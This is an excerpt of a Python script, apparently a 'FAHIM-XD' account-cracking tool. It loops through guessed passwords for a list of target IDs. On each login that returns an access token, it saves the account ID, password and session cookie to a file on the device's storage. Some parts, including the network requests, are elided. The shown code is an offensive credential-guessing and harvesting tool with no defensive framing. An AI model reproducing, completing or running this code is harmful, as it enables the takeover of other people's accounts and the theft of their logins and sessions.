...
def file():
    clear()
    print(f' {G1}[{A}≈{G1}]{G1} EXAMPLE {A}➢{G1} /{A}sdcard{G1}/{A}FAHIM.txt');linex()
...
def M1(ids,names,psd):
    ...
    sys.stdout.write(f'\r\r{A}[{G1}FAHIM-XD{A}]-[{G1}{loop}{A}]-[{G1}OK{A}:{G1}{len(ok)}{A}] ')
    sys.stdout.flush()
    try:
        fn = names.split(' ')[0]
        ...
        for pw in psd:
            ...
            if 'access_token' in po:
                ...
                open('/sdcard/FAHIM-XDFILE-OK.txt','a').write(uid+'|'+pas+'|'+coki+'\n')
                ok.append(ids)
                break
